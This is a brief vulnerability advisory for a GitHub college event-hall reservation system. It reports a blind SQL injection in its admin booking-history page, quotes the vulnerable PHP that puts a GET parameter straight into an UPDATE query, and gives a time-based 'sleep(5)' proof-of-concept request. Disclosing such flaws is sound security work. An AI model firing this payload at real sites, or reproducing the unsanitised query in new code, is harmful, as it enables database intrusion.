# MAGESH-K21 / Online-College-Event-Hall-Reservation-System - Blind SQL Injection book_hitory.php

## **Credits**
> Joshua Lictan (https://github.com/skid-nochizplz/skid-nochizplz)<br/>

## Vendor Homepage:
> https://github.com/MAGESH-K21/Online-College-Event-Hall-Reservation-System/

## Affected Component
> /admin/book_history.php

## Code
```php
if(isset($_GET['del_id'])){
    $del_id = $_GET['del_id'];
    $sql = "UPDATE tbl_book_history SET status='Cancelled' WHERE book_id=$del_id";
    $result = $conn->query($sql);
}
```

## Proof of Concept
**HTTP Request Example**
``` http request
GET /admin/book_history.php?del_id=sleep(5) HTTP/1.1
Host: [REDACTED]
```

## Screenshot

![image](https://github.com/skid-nochizplz/skid-nochizplz/assets/60700937/307008fe-48d1-4e75-bfc7-2cc12a1f3563)
